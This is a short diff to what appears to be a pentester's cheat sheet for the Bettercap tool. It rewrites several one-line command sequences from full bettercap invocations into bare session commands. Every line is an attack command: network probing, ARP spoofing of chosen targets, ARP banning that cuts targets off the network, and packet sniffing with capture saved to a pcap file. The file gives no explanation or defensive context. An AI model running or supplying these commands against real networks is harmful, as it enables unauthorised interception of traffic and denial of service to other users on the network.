@@ -1,6 +1,9 @@
 Bettercap v2.9
 
-bettercap -iface eth0 -eval "net.probe on; ticker on " 
-bettercap -iface eth0 -eval "set arp.spoof.targets IP; arp.spoof on; set arp.ban on; net.probe on" 
-bettercap -iface eth0 -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output /tmp/sniff_all.pcap; set net.sniff.verbose false; net.sniff on"
-bettercap -iface eth0 -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on "
+net.probe on; ticker on
+
+set arp.spoof.targets IP; arp.spoof on; set arp.ban on; net.probe on
+
+net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output /tmp/sniff_all.pcap; set net.sniff.verbose false; net.sniff on
+
+net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on
